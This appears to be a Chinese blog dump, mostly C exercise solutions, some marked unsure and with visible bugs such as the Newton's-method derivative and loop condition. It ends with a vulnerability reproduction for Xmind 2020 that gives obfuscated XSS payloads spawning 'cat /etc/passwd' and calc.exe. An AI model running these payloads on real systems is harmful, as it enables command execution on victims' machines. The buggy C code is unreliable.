EOF)\n\t//{\n\t\t++j;\n\t\tn=t[j];\n\t\tok = 0;  //先置标志位为0\n\t\tfor (i = 2; i<=n/2; i++)\n\t\t{\n\t\t\tif(is_prime(n) == 1 && is_prime(n-i) == 1)  //相加之和为这个数的另一个数如果也是素数\n\t\t\t{\n\t\t\t\tprintf(\"数字%d可由以下两个素数相加而来：\\n\",n);\n\t\t\t\tprintf(\"%d %d\\n\", i, n-i); // n和n-i都是素数，则打印\n\t\t\t\tok = 1;\n\t\t\t}\n\t\t\tif(i != 2)\n\t\t\t\ti++;\n\t\t\tif(ok)\n\t\t\t\tbreak; //已打印出所需要的输出结果，跳出循环\n\n\t\t}\n\t//}\n\t}\n}\n```\n\n\n\n#### 80.用1,2,3,4共四个数字，能组成多少个互不相同且无重复数字的三位数？\n\n```c\nvoid three_num()\n{\n\tint count=0;\n\n\tfor (int i = 1; i < 5; i++)\n\t{\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tfor (int k = 1; k < 5; k++)\n\t\t\t{\n\t\t\t\tif(i!=j && i!=k && j!=k)\n\t\t\t\t{\n\t\t\t\t\tcount += 1;\n\t\t\t\t\tprintf(\"%d%d%d \", i,j,k);\n\n\t\t\t\t\t//美观，每10个换一次行\n\t\t\t\t\tif(count%10 == 0)\n\t\t\t\t\t\tprintf(\"\\n\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tprintf(\"共有%d组\", count);\n}\n```\n\n\n\n\n\n#### 81.约瑟夫环问题\n\n编号为1，2，3，… n的n个人围坐一圈，任选一个正整数 m 作为报数上限值，从第一个人开始按顺时针方向报数，报数到 m 时停止，报数为m的人出列。从出列人的顺时针方向的下一个人开始又从1重新报数,如此下去,直到所有人都全部出列为止。\n**解答:**函数中利用循环访问数组中n个元素，每次访问元素，设定内循环连续访问m 个元素,元素访问的下标为k,访问到第m个元素时，如果元素不是0,此时输出元素 a[k],再设定 a[K]为0，继续访问后面的元素。\n\n```c\n//???没懂\n\n#define N 10\nint ysfh(int a[], int n, int m)\n{\n\tint i, j, k=0;\n\tfor (i = 0; i < n; i++)\n\t{\n\t\tj = 1;\n\t\twhile (j<m) //报1,2...m-1的人\n\t\t{\n\t\t\twhile (a[k]==0)\n\t\t\t{\n\t\t\t\tk = (k+1)%n;\n\t\t\t}\n\t\t\tj++;\n\t\t\tk = (k+1)%n;  //类比循环队列，对n求余能够实现循环\n\t\t}\n\t\twhile (a[k] == 0)\n\t\t{\n\t\t\tk = (k+1)%n; \n\t\t}\n\t\tprintf(\"%d \", a[k]);  //输出依次被淘汰的人\n\t\ta[k]=0;\n\t}\n\t\n\treturn 0;\n}\n\n\nvoid ysfh_test()\n{\n\tint arr[100];\n\tint i,j,m,n;\n\tprintf(\"输入n和m: \");\n\tscanf(\"%d%d\", &n,&m);\n\tfor (i = 0; i < n; i++)  \n\t{\n\t\tarr[i] = i+1;   //生成初始化数组\n\t}\n\tysfh(arr, n, m);   //调用\n\n\tprintf(\"\\n\");\n}\n```\n\n\n\n#### 82.狼抓兔子问题\n\n一只兔子躲进了10个环形分布的洞的某一个,狼在第一个洞没有找到免子,就隔一个洞,到第个洞去找,也没有找到，就隔两个洞，到第六个洞去找,以后每次多隔一个洞去找兔子……这样下去,结果一直找不到兔子,请问:兔子可能躲在哪个洞中?（设最大寻找次数为1000）\n\n\n\n```c\nvoid walf()\n{\n\t\n\tint a[10];                     //10个洞 \n\tint i,n=0,x=0;                 //n->累加洞编号 x->洞下标 \n\n\tfor(i=0;i<10;i++)              //数组初始化为1，标记兔子可能藏在各个洞 \n\t\ta[i]=1;\n\n\tfor(i=0;i<1000;i++)            //设最大寻找次数为1000 \n\t{\n\t\tn+=(i+1);                  //每次多隔1个洞 \n\t\tx=n%10;                    //取余，往回找 \n\t\ta[x]=0;                    //访问过的洞标记为0，说明没有兔子 \n\t}\n\n\tfor(i=0;i<10;i++)             \n\t{\n\t\tif(a[i])                   //狼未访问过的洞，说明可能有兔子 \n\t\t\tprintf(\"兔子可能在第%d个洞中\\n\",i+1);\n\n\t}\n\n\n}\n\n```\n\n\n\n#### 83.马克思手稿中的数学题\n\n马克思手稿中有一道趣味数学问题：有30个人，其中有男人、女人和小孩，他们在同一家饭馆吃饭，总共花了50先令。已知每个男人吃饭需要花3先令，每个女人吃饭需要花2先令，每个小孩吃饭需要花1先令，请编程求出男人、女人和小孩各有几人。\n\n**分析：**\n\n![image-20210418074530569](C:\\Users\\19401\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210418074530569.png)\n\n\n\n在问题分析中我们抽象出了一个不定方程组，显然得到了不定方程组的解，该问题也就解决了。但不定方程组中包含了 x、y、z 这3个变量，而方程只有两个，因此不能直接求出x、y、z的值。\n\n而由方程 (3)，我们得到了x的取值范围，因此可将x的有效取值依次代入不定方程组中（即方程 (1)、(2) 和 (3)）中，能使3个方程同时成立的解即为该问题的解。为实现该功能,只需使用一个for循环语句即可。\n\n\n\n**代码：**\n\n```c\nvoid mxs_math()\n{\n\tint x, y, z, number=0;\n\n\tprintf(\"男人  女人  孩子\");\n\n\tfor (x = 0; x <= 10; x++)   //已经x的范围，则就在这个范围内依次遍历取有效值\n\t{\n\t\ty = 20 - 2*x;   //表示y\n\t\tz = 30 - x - y;  //表示z\n\n\t\tif(3*x + 2*y + z == 50)  //如果当前x, y, z的取值满足30个人吃饭总共花了50先令，则输出\n\t\t\tprintf(\"%2d:%4d%5d%6d\\n\", ++number, x, y, z);\n\t}\n}\n\n```\n\n\n\n#### 84.爱因斯坦台阶问题\n\n爱因斯坦曾经提出过这样一道有趣的数学题：\n\n有一个长阶梯，若每步上2阶，最后剩下1阶（即x%2 = 1）；\n\n若每步上3阶，最后剩2阶（x%3 = 2）；\n\n若每步上5阶，最后剩下4阶（x%5 = 4）；\n\n若每步上6阶，最后剩5阶（x%6 = 5）；\n\n只有每步上7阶，最后刚好一阶也不剩（x%7 = 0）。\n\n请问该阶梯至少有多少阶？\n\n```c\nvoid aiyinsitan()\n{\n\tint i; // 阶梯数\n\tint count =0;   //记录满足条件的阶梯个数\n\tfor (i = 1; i < 1000; i++)\n\t{\n\t\tif(i%2==1 && i%3==2 && i%4==3 && i%5==4 && i%6==5 && i%7==0)\n\t\t{\n\t\t\tcount ++;\n\t\t\tprintf(\"%d 可以\\n\", i);\n\t\t}\n\t}\n\tprintf(\"共有%d个台阶满足条件\\n\", count);\n}\n\n```\n\n\n\n\n\n#### 85.牛顿迭代法求方程根\n\n>谭浩强C程序设计（第四版）p218第12题\n\n方程ax^3+bx^2+cx+d=0，系数a，b，c，d由主函数输入。求x在1附近的一个实根，由主函数输出。\n\n牛顿的迭代法公式是：x = x0-f(x0)/f’(x0), 设迭代到`|x - x0| <= 10^-5`结束\n\n```c\nfloat niudun(float a, float b, float c, float d)  //系数由外部手动传入\n{\n\tfloat x0, x=1.5, f, fd, h; // f为方程的值，fd为方程求导后的值\n\n\tdo\n\t{\n\t\tx0 = x; //用所求的的x的值来代替x0原来的值\n\t\tf = a*x0*x0*x0 + b*x0*x0 + c*x0 + d;\n\t\tfd = a*x0*x0 + b*x0 + c;\n\t\th = f / fd;\n\t\tx = x0 - h;\n\t}while (fabs(x-x0) <= 1e-5);\n\t\n\treturn x;\n}\n\n```\n\n\n\n#### 86.枚举排列组合\n\n给定集合`S={a,b,c,d,e,f,g}`, 请编写一段程序枚举出其中任意三元素构成的所有排列组合，如acd, dea等。\n\n**分析:**枚举法一般需要设置多个循环，需要枚举几个元素就嵌套几层循环，在各层循环之间设置题目要求的限定关系输出即可(比如本题的各元素不能相同等)\n\n```c\nvoid sorAndCombination(char str[], int n)\n{\n\tint count = 0;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tfor (int k = 0; k < n; k++)\n\t\t\t{\n\t\t\t\tif ((str[i] != str[j]) &&  (str[i] != str[k]) && (str[j] != str[k]))\n\t\t\t\t\tprintf(\"%c%c%c\\n\", str[i], str[j], str[k]);\n\t\t\t\t    count ++;\n\t\t\t}\n\t\t}\n\t}\n\n\tprintf(\"共%d种组合\", count);\n}\n\nvoid sorAndCombination_test()\n{\n\tchar s[] = \"abcd\";\n\tsorAndCombination(s, 4);\n}\n```\n\n\n\n#### 87.乒乓球对手匹配问题\n\n两个乒乓球队进行比赛，各出三人。甲队为a,b,c三人，乙队为x,y,z三人。已抽签决定\n比赛名单。有人向队员打听比赛的名单。a说他不和x比，c说他不和x,z比，请编程序找出三队赛手的名单。\n\n**解答:**通过循环嵌套校举出可能的对战顺序，再用if语句判断避免参赛的队员重复，最后通过题目要求筛选出符合题意的对手。\n\n```c\nvoid ball()\n{\n\tfor (char i = 'X'; i <= 'Z'; i++)\n\t{\n\t\tfor (char j = 'X'; j <= 'Z'; j++)\n\t\t{\n\t\t\tfor (char k = 'X'; k <= 'Z'; k++)\n\t\t\t{\n\t\t\t\tif ((i != j) &&  (i != k) && (j != k))  //避免队员重复\n\t\t\t\t{\n\t\t\t\t\tif((i!='X') && (k!='X') && (k!='Z'))\n\t\t\t\t\t{\n\t\t\t\t\t\tprintf(\"A --> %c\\n\", i);\n\t\t\t\t\t\tprintf(\"B --> %c\\n\", j);\n\t\t\t\t\t\tprintf(\"B --> %c\\n\", k);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\n```\n\n\n\n#### 88.换分币问题\n\n将5元的人民币兑换成1元、5角和1角的硬币。共有多少种不同的兑换方法\n\n```c\nvoid money()\n{\n\t//int sum = 50, count=0;  // //将单位全部转化成角\n\tint count = 0;\n\tfor (int i = 0; i <=50; i+=10)  //i为为1元硬币钱数，其取值为0,10,20,30,40,50(以角为单位)\n\t{\n\t\tfor (int j = 0; j <=50; j+=5)   // j为5角硬币钱数，其取值为0,5,10,15,20,25,30,35,40,,45,50\n\t\t{\n\t\t\tfor (int k = 0; k <=50; k++)   // k为1角硬币钱数，其取值为0,1,...50\n\t\t\t{\n\t\t\t\tif (i+j+k == 50)\n\t\t\t\t{\n\t\t\t\t    //printf(\"10*%d+5*%d+1*%d\\n\", i/10, j/5, k);\t\t\n\t\t\t\t\tprintf(\"1元*%d + 5角*%d + 1角*%d\\n\", i/10, j/5, k);\t\n\t\t\t\t    count ++;\n\t\t\t\t}\t\t\t \n\t\t\t}\n\t\t}\n\t}\n\n\tprintf(\"共%d种兑换方法\", count);\n}\n```\n\n\n\n#### 89.百钱买百鸡问题\n\n中国古代数学家张丘建在他的(算经)中提出了一个著名的“百钱买百鸡问题”，鸡翁一，值钱五；\n\n鸡母一，值钱三；鸡雏三，值钱一。百钱买百鸡，问翁、母、雏各几何?\n\n```c\nvoid chicken()\n{\n\t// 可以得到方程组如下：\n\t/*\n\t5x + 3y + 1/3*z = 100\n\tx + y + z =100\n\t0 <= x <= 100\n\t0 <= y <= 100\n\t0 <= z <= 100\n\t*/\n\n\t//if( (x*5 + y*3 + z/3) == 100  && z%3==0  && x+xy+z==100)\n\tfor (int i = 0; i <= 100; i++)\n\t{\n\t\tfor (int j = 0; j <= 100; j++)\n\t\t{\n\t\t\tfor (int k = 0; k <= 100; k++)\n\t\t\t{\n\t\t\t\tif((5*i + 3*j +k/3)==100  && k%3==0  && i+j+k==100)\n\t\t\t\t{\n\t\t\t\t\t\n\t\t\t\t\tprintf(\"公鸡:%d, 母鸡:%d, 小鸡:%d\\n\", i, j, k);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n\n\n\n\n#### 90.实现如下表所示的5-魔方阵\n\n| 17   | 24   | 1    | 8    | 15   |\n| ---- | ---- | ---- | ---- | ---- |\n| 23   | 5    | 7    | 14   | 16   |\n| 4    | 6    | 13   | 20   | 22   |\n| 10   | 12   | 19   | 21   | 3    |\n| 11   | 18   | 25   | 2    | 9    |\n\n**问题分析:**\n\n所谓“n-魔方阵”，指的是使用1〜n2共n2个自然数排列成一个n×n的方阵，其中n为奇数；该方阵的每行、每列及对角线元素之和都相等，并为一个只与n有关的常数，该常数为n×(n2+1)/2。\n\n\n\n```c\n// ???\n/*\n例如4-魔方阵，其第一行、第一列及主对角线上各元素之和如下：\n\n第一行元素之和：17+24+1+8+15=65\n\n第一列元素之和：17+23+4+10+11=65\n\n主对角线上元素之和：17+5+13+21+9=65\n\n而 n×(n2+1)/2=5×(52+1)/2=65 可以验证，5-魔方阵中其余各行、各列及副对角线上的元素之和也都为65。\n\n假定阵列的行列下标都从0开始，则魔方阵的生成方法为：在第0行中间置1，对从2开始的其余n2-1个数依次按下列规则存放：\n\n(1) 假定当前数的下标为(i，j)，则下一个数的放置位置为当前位置的右上方，即下标为(i-1，j+1)的位置。\n\n(2) 如果当前数在第0行，即i-1小于0，则将下一个数放在最后一行的下一列上，即下标为(n-1，j+1)的位置。\n\n(3) 如果当前数在最后一列上，即j+1大于n-1，则将下一个数放在上一行的第一列上，即下标为(i-1，0)的位置。\n\n(4) 如果当前数是n的倍数，则将下一个数直接放在当前位置的正下方，即下标为(i+1，j)的位置\n\n*/\n\n\n/*\n【算法设计】\n在设计算法时釆用了下面一些方法：\n\n定义array()函数，array()函数的根据输入的n值，生成并显示一个魔方阵，当发现n不是奇数时，就加1使之成为奇数。\n\n使用动态内存分配与释放函数malloc()与free()，在程序执行过程中动态分配与释放内存，这样做的好处是使代码具有通用性，同时提高内存的使用率。\n\n在分配内存时还要注意，由于一个整型数要占用两个内存，因此，如果魔方阵中要存放的数有max个，则分配内存时要分配2*max个单元，从而有malloc(max+max)。在malloc()函数中使用max+max而不是2*max是考虑了程序运行的性能。显然应该使用二维数组来表示魔方阵，但虽然数组是二维形式的，而由于内存是一维线性的，因此在存取数组元素时，要将双下标转换为单个索引编号。在程序中直接定义了指针变量来指向数组空间，即使用malloc()函数分配的内存。\n\n*/\n\n//90.实现如下表所示的5-魔方阵\nint mofang(int n)\n{\n\tint i, j, no, num, max;\n\tint *mtrx;\n\tif(n%2 == 0) /*如果n是偶数，则加1使其变为奇数*/\n\t\tn=n+1;\n\n\tmax=n*n;\n\tmtrx = (int *)malloc(max+max);  //为魔方阵分配内存\n\tmtrx[n/2]=1; /* 将1存入数组*/\n\ti=0; /*自然数1所在行*/\n\tj=n/2; /*自然数1所在列*/\n\n\t//从2开始确定每个数的存放位置\n\tfor(num=2; num<=max; num++)\n\t{\n\t\tif((num-1)%n == 0) /*如果当前数是n的倍数 ？？？ */\n\t\t{\n\t\t\ti=i+2;\n\t\t\tj=j-1;\n\t\t}\n\n\t\tif(i<0) /*当前数在第0行*/\n\t\t{\n\t\t\ti=n-1;\n\t\t}\n\n\t\tif(j>n-1) /*当前数在最后一列，即n-1列*/\n\t\t{\n\t\t\tj=0;\n\t\t}\n\n\t\tno=i*n+j; /*找到当前数在数组中的存放位置*/\n\t\tmtrx[no]=num;\n\t}\n\n\n\n\t/*打印生成的魔方阵*/\n\tprintf(\"生成的%d-魔方阵为:\",n);\n\tno=0;\n\tfor(i=0; i<n; i++)\n\t{\n\t\tprintf(\"n\");\n\n\t\tfor(j=0; j<n; j++)\n\t\t{\n\t\t\tprintf(\"%3d\", mtrx[no]);\n\t\t\tno++;\n\t\t}\n\t}\n\n\tprintf(\"n\");\n\tfree(mtrx);\n\n\treturn 0;\n}\n\nvoid mofang_test()\n{\n\tint n;\n\n\tprintf(\"请输入n值:\");\n\tscanf(\"%d\", &n);\n\n\tmofang(n); /*调用函数*/\n\n}\n\n\n\n\n\n\n```\n\n\n\n\n\n\n\n#### 91.给定一个有序数组，你要在原地删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度\n\n![image-20210420234453370](C:\\Users\\19401\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210420234453370.png)\n\n```c\n// ???\n\nint remove2(int* nums, int numsSize)\n{\n\tint i;\n\tint j=1;\n\tint len=numsSize;\n\tint temp=nums[0];  // i用于遍历数组，j用于记录不同的元素到数组中，k用于记录不同的元素于数组中, temp基准值\n\n\tfor (i = 1; i < numsSize; i++) //遍历数组\n\t{\n\t\tif(nums[i] != temp) //若元素不等于基值，将其放入数组前方，并且作为新基准值\n\t\t{\n\t\t   nums[j++]=nums[i];\n\t\t   temp = nums[i];\n\t\t}\n\t\telse\n\t\t\tlen--;  \n\t}\n\n\treturn len;\n}\n\n\n\nvoid main()\n{\n\tint nums[11] = {1,1,2,3,3,4,5,6,6,6,7};  //给定一个有序数组\n\tprintf(\"\\n新长度:%d\", remove2(nums, 11));\n\n}\n```\n\n```c\n//添加个打印新的的元素的功能\nvoid remove2(int* nums, int numsSize)\n{\n\tint i;\n\tint j=1;\n\tint len=numsSize;\n\tint temp=nums[0];  // i用于遍历数组，j用于记录不同的元素到数组中，k用于记录不同的元素于数组中, temp基准值\n\n\tfor (i = 1; i < numsSize; i++) //遍历数组\n\t{\n\t\tif(nums[i] != temp) //若元素不等于基值，将其放入数组前方，并且作为新基准值\n\t\t{\n\t\t   nums[j++]=nums[i]; // 是先把nums[j]=nums[i], 然后j再加1是吗\n\t\t   temp = nums[i];\n\t\t}\n\t\telse\n\t\t\tlen--;  \n\t}\n\tprintf(\"新长度为: %d\\n\", len);\n\n\t//打印元素\n\tprintf(\"新元素为: \");\n\tfor(i=0; i<len; i++){\n        printf(\"%d\",nums[i]);\n    }\n\tprintf(\"\\n\");\n}\n\nvoid main()\n{\n\tint nums[11] = {1,1,2,3,3,4,5,6,6,6,7};  //给定一个有序数组\n\tremove2(nums, 11);\n}\n```\n\n\n\n\n\n\n\n#### 92.三旗问题\n\n假设有一条绳子，上面有红、白、蓝三种颜色的旗子，起初绳子上的旗子的颜色并没有顺序，你希望将之分类并排列为**蓝、白、红的顺序**，要如何移动次数最少，注意你只能在绳子上进行这个动作，并且一次只能调换两个旗子。\n\n**翻译成白话就是这个意思：**有123三个数，每个数字的个数不定，数字间顺序不定，要求用最少的步数将他改成111222333这种情况，即相同数字挨着，不同数字按顺序排列。\n\n\n\n```c\n/*\n如果排列顺序是b，w，r。我们如下定义这三个指针的意义：b永远指向第一个不是b的元素（即从开始位置起，第一个不是b的元素），w作为遍历的游标，往下运行，并判断该元素是不是w，如果是不做处理，继续往下运行，如果是b则与b指向的元素交换，如果是r则与r指向的元素交换。\nr永远指向第一个不是r的元素，不同的是，r是从这个数列的最后开始的，因为我们最终要将r放到后面。\n如此一次遍历该数列时，\n遇到第一个元素如果是b，则w和b继续往下走，\n如果是w，则b指向该元素，w往下走，\n如果是r，则在r的地方找到第一个不是r的元素并交换，\n以此类推，遇到w继续走，遇到b往前移，遇到r往后移\n\n*/\n\n#define BLUE 'b'\n#define WHITE 'w'\n#define RED 'r'\n\n\n#define SWAP(x,y){char temp; temp = color[x]; color[x] = color[y]; color[y] = temp;}\n\n\n\n\n```\n\n\n\n\n\n#### 93.猴子吃桃问题\n\n猴子第一天摘下若干个桃子，当即吃了一半，还不过瘾，又多吃了一个。**第二天早上又将第一天剩下的桃子吃掉一半，又多吃了一个**。以后每天早上都吃了前一天剩下的一半零一个。到第 10 天早上想再吃时，发现只剩下一个桃子了。编写程序求猴子第一天摘了多少个桃子。\n\n```c\n// 递归方式\nint monkey(int day) //返回第day天时的桃子数\n{\n\tint num;\n\tif(day == 10)\n\t\treturn 1;\n\telse\n\t{\n\t\treturn 2*(monkey(day+1) + 1);\n\t\t\n\t}\n}\n\nvoid main()\n{\n    printf(\"第1天的桃子数：%d\\n\", monkey(1));\n    \n\t//for(int i=1;i<=10;i++)\n\t//{\n\t//\tprintf(\"第%d天的桃子数：%d\\n\", i, monkey(i));\n\t//\n\t//}\n}\n```\n\n```c\n//循环方式\n#include<stdio.h>\n\nint main(void)\n{\n    int day, x1, x2=1; //第10天1个桃子\n    for(day=10;day>=1;day--)\n    {\n        printf(\"第%d天的桃子数为：%d \",day,x2);\n        x1=2*(x2+1);\n        x2=x1;\n    }\n}\n```\n\n\n\n\n\n#### 94.求黑洞数\n\n编程求三位数中的“黑洞数”。\n\n黑洞数又称陷阱数，任何一个数字不全相同的整数，经有限次“重排求差”操作，总会得到某一个或一些数，这些数即为黑洞数。“重排求差”操作是将组成一个数的各位数字重排得到的**最大数**减去**最小数**，例如207，“重排求差”操作序列是720-027=693，963-369=594，954-459=495，再做下去就不变了，再用208算一次，也停止到495，所以495是三位黑洞数。\n\n**问题分析:** 根据“黑洞数”定义，对于任一个数字不全相同的整数，最后结果总会掉入到一个黑洞圈或黑洞数里，最后结果一旦为黑洞数，无论再重复进行多少次的“重排求差”操作，则结果都是一样的，可把结果相等作为判断“黑洞数”的依据。\n\n**算法设计：**\n\n(1) 将任一个三位数进行拆分。\n(2) 拆分后的数据重新组合，将可以组合的最大值减去最小值，差赋给变量j。\n(3) 将当前差值暂存到另一变量h中：h=j。\n(4) 对变量j执行拆分、重组、求差操作，差值仍然存储到变量j中。\n(5) 判断当前差值j是否与前一次的差相等，若相等将差值输出并结束循环，否则，重复步骤 (3)、(4) 和 (5)。\n\n```c\n//求三个数中的最大值\nint max_3(int a,int b,int c)\n{\n\tint tmp;\n\tif(a<b)\n\t{ tmp=a; a=b; b=tmp; }\n\tif(a<c)\n\t{ tmp=a; a=c; c=tmp; }\n\tif(b<c)\n\t{ tmp=b; b=c; c=tmp; }\n\n\treturn (a*100 + b*10 + c);\n\n}\n\n//求三个数中的最小值\nint min_3(int a,int b,int c)\n{\n\tint tmp;\n\tif(a<b)\n\t{ tmp=a; a=b; b=tmp; }\n\tif(a<c)\n\t{ tmp=a; a=c; c=tmp; }\n\tif(b<c)\n\t{ tmp=b; b=c; c=tmp; }\n\n\treturn (c*100 + b*10 + a);\n\n}\n\n//测试函数\nvoid heidong()\n{\n\tint num, ge, shi, bai, max, min, j, k, h;\n\tprintf(\"请输入一个三位数：\");\n\tscanf(\"%d\", &num);\n    bai=num/100;\n    shi=num%100/10;\n    ge=num%10;\n\n\tmax = max_3(bai, shi, ge);\n    min = min_3(bai, shi, ge);\n\tj = max - min;\n\n    for(k=0; ; k++)  /*k控制循环次数*/\n\t{\n\t    h=j;  /*h记录上一次最大值与最小值的差*/\n\n\t\tbai=num/100;\n\t\tshi=num%100/10;\n\t\tge=num%10;\n\t\tmax = max_3(bai, shi, ge);\n\t\tmin = min_3(bai, shi, ge);\n\t\tj = max - min;\n\n\t\tif(j==h)  /*最后两次差相等时，差即为所求黑洞数*/\n        {\n            printf(\"%d\\n\", j);\n            break;  /*跳出循环*/\n        }\n\t}\n\n\n\n}\n\n```\n\n\n\n\n\n#### 95.分鱼问题_1\n\n**问题分析：**\n\n假设5个人合伙捕了x条鱼，则“A第一个醒来，他将鱼平分为5份，把多余的一条扔回河中，然后拿着自己的一份回家去了”之后，还剩下4(x-1)/5条鱼。\n\n这里实际包含了一个隐含条件：假设Xn为第n(n=1、2、3、4、5)个人分鱼前鱼的总数，则(Xn-1)/5必须为正整数，否则不合题意。（Xn-1)/5为正整数即(X〜l)mod5=0必须成立。\n\n又根据题意，应该有下面等式：\nX4=4(X5-1)/5\nX3=4(X4-1)/5\nX2-4(X3-1)/5\nX1=4(X2-1)/5\n\n则一旦给定X5，就可以依次推算出X4、X3、X2和X1的值。要保证X5、X4、X3、X2和X1都满足条件(Xn-1)mod5=0，此时的**X5**则为5个人合伙捕到的鱼的**总条数**。显然，5个人合伙可能捕到的鱼的条数并不唯一，但题目中强调了 “至少”合伙捕到的鱼，此时题目的答案唯一。该问题可使用递归的方法求解。\n\n**程序设计:**\n\n在main()函数中构建一个不定次数的do-while循环。定义变量x表示5个人合伙可能捕到的鱼的条数，可以取x的最小值为6，让x值逐渐增加，x每一次取值，都增加5，直到找到一个符合问题要求的答案。由于题目中问“这5人至少合伙捕到多少条鱼”，而我找到的第一个x值就是5个人至少捕到的鱼的总条数。\n\n通过这个循环，就可以对每一个的可能情况进行检查。当然，是通过调用分鱼的递归函数来进行检查的。\n\n分鱼的递归函数如下：\nfish()函数中包含了两个参数：n和x。n表示参与分鱼的人数，x表示n个人分鱼前鱼的总条数。这两个参数都是由main()函数中传递进来的。\n\n根据前面的分析，当n=5时，(x-1)mod5==0必须成立，否则该x值不是满足题意的值，退出fish()函数，返回到main()函数，main()函数中再传递新的x值到fish中进行检验。如果(x-1)mod5==0条件成立，则要判断n=4时，(x-1)mod5=0条件是否成立，需要注意的是，此时的形参x是4个人分鱼前鱼的总条数，即f(5,x)递归调用f(4,(x-1)/5*4)。这样依次进行下去，直到n=1时，(x-1)mod5==0条件仍成立，则说明开始从main()函数中传递进来的x值是符合题意要求的一个值，可以逐层从递归函数中返回，每次返回值都为1，直至返回到main()函数。\n\n```c\nint fish(int n, int x)\n{\n\tif((x-1)%5 == 0)\n\t{\n\t\tif(n==1)\n\t\t\treturn 1;\n\t\telse\n\t\t\treturn fish(n-1, (x-1)/5*4);\t\n\t}\n\treturn 0;\n}\n\n\nvoid fish_test()\n{\n\tint i=0, flag=0, x;\n\tdo\n\t{\n\t\t i += 1;\n\t     x=i*5+1;  /*x最小值为6，以后每次增加5*/\n\t\t if(fish(5,x))  /*将x传入分鱼递归函数进行检验*/\n\t\t {\n\t\t    flag=1;  /*找到第一个符合题意的x, 则置标志位为1*/\n            printf(\"五个人合伙捕到的鱼总数为%d\\n\", x);\n\t\t }\n\t\n\t}while (!flag);\n\n}\n```\n\n\n\n\n\n#### 96.分鱼问题_2\n\n甲、乙、丙三位渔夫出海打鱼，他们随船带了21只箩筐。当晚返航时，他们发现有7筐装满了鱼，还有7筐装了半筐鱼，另外7筐则是空的，由于他们没有秤，只好通过目测认为7个满筐鱼的重量是相等的，7个半筐鱼的重量是相等的。在不将鱼倒出来的前提下,怎样将鱼和筐平分为3份？\n\n\n\n```c\n//未完待续...\n\n```\n\n\n\n\n\n\n\n\n\n","tags":["编程刷题"],"categories":["C语言"]},{"title":"递归求具有n个元素的整型数组R的平均值","url":"%2Fposts%2F9010%2F","content":"\n\n\n#### 递归求具有n个元素的整型数组R的平均值\n\n今天做题的时候遇到这个不会的题，虽然题很简单单还是太菜了，记录下来，这还是问了一个小学妹之后才懂了，自卑ing... ...\n\n\n\n```c\nint get_agv(int R[], int n)\n{\n\tif(n==1)\n\t\treturn R[0];\n\telse\n\t\treturn (R[n-1] + get_agv(R, n-1)*(n-1))/n;\t   // n-1  用来约分母(约前面一个数的分母)， 把分母写在横线的下面比较容易看出来\n}\n\n\nvoid main()\n{\n\tint R[5] = {22,44,66,88,10};\n\tprintf(\"平均值: %d\\n\", get_agv(R, 5));\n}\n\n```\n\n\n\n最后一句：return (R[n-1] + get_agv(R, n-1)*<font color=red>(n-1</font>))/n;中的n-1是用来约分母的(约前面一个数的分母)，比如下面这样更直观一点\n\n![示意图](http://image.xpshuai.cn/%E6%B1%82%E5%B9%B3%E5%9D%87%E5%80%BC%E9%A2%98.jpg)\n\n\n\n","tags":["笔记"],"categories":["编程"]},{"title":"xmind2020存在XSS漏洞可导致命令执行","url":"%2Fposts%2F45828%2F","content":"\n### 漏洞描述\n\nXmind2020 存在XSS漏洞，攻击者可利用该漏洞进行命令执行。由于软件允许用户以文件形式或自定义标题标题的形式存储JS代码，攻击者可以发送带有恶意JS代码的文件。用户打开文件后，从而执行攻击者预先设定好的命令。\n\n\n\n\n\n### 漏洞复现\n\n测试环境：ubuntu18.04、xmind2020\n\n\n\n**1.打开xmind后，在思维导图模式下输入以下Payload：**\n\n```javascript\n<img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,99,111,110,115,116,32,123,32,115,112,97,119,110,32,125,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,59,10,99,111,110,115,116,32,99,97,116,32,61,32,115,112,97,119,110,40,34,99,97,116,34,44,32,91,34,47,101,116,99,47,112,97,115,115,119,100,34,93,41,59,10,99,97,116,46,115,116,100,111,117,116,46,111,110,40,34,100,97,116,97,34,44,32,100,97,116,97,32,61,62,32,123,10,32,32,32,32,97,108,101,114,116,40,96,115,116,100,111,117,116,58,32,36,123,100,97,116,97,125,96,41,59,10,125,41,59,60,47,115,99,114,105,112,116,62))>\n```\n\n解码后数据即为：\n\n```javascript\n//Decode Payload\n<script>\nconst { spawn } = require(\"child_process\");\nconst cat = spawn(\"cat\", [\"/etc/passwd\"]);\ncat.stdout.on(\"data\", data => {\n    alert(`stdout: ${data}`);\n});</script>\n```\n\n![插入payload](http://image.xpshuai.cn/xmind_payload1.png)\n\n\n\n补充知识：\n\n```javascript\n// 1.str转unicode序列\nvar c = \"<script>\\nvar Process = process.binding('process_wrap').Process;\\nvar proc = new Process();\\nproc.onexit = function(a,b) {};\\nvar env = process.env;\\nvar env_ = [];\\nfor (var key in env) env_.push(key+'='+env[key]);\\nproc.spawn({file:'c:\\\\windows\\\\system32\\\\calc.exe',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\\n</script>\"\n\nvar codeArr = [];\nfor(var i=0;i<c.length;i++){\n    codeArr.push(c.charCodeAt(i));\n}\nconsole.log(codeArr);\n\n\n\n// 2.unicode序列还原为str\nvar n = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 10, 118, 97, 114, 32, 80, 114, 111, 99, 101, 115, 115, 32, 61, 32, 112, 114, 111, 99, 101, 115, 115, 46, 98, 105, 110, 100, 105, 110, 103, 40, 39, 112, 114, 111, 99, 101, 115, 115, 95, 119, 114, 97, 112, 39, 41, 46, 80, 114, 111, 99, 101, 115, 115, 59, 10, 118, 97, 114, 32, 112, 114, 111, 99, 32, 61, 32, 110, 101, 119, 32, 80, 114, 111, 99, 101, 115, 115, 40, 41, 59, 10, 112, 114, 111, 99, 46, 111, 110, 101, 120, 105, 116, 32, 61, 